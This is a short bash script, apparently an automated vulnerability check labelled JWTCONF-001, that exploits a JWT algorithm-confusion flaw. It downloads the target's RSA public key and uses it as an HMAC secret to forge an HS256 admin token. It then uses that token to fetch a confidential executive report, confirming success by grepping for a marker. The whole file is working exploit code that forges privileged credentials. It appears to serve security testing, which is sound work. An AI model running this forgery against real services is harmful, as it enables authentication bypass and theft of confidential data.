#!/usr/bin/env bash
# JWTCONF-001 (CWE-347): RS256->HS256 JWT algorithm confusion. The RS256 verifier
# also accepts HS256 tokens, HMAC-verified with the RSA PUBLIC KEY as the secret.
# The public key is published, so we forge an admin token with it.
set -eu; . "$(dirname "$0")/_lib.sh"
PUB="$(mktemp)"
curl -s -o "$PUB" "$TARGET/api/auth/rs-public-key"
TOKEN=$(python3 - "$PUB" <<'PY'
import sys,hmac,hashlib,base64,json
pub=open(sys.argv[1],"rb").read()
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b"=").decode()
h=b(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")).encode())
p=b(json.dumps({"sub":1,"email":"attacker@evil","role":"admin"},separators=(",",":")).encode())
sig=hmac.new(pub, f"{h}.{p}".encode(), hashlib.sha256).digest()
print(f"{h}.{p}.{b(sig)}")
PY
)
rm -f "$PUB"
curl -s -H "authorization: Bearer $TOKEN" "$TARGET/api/reports/exec-summary" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
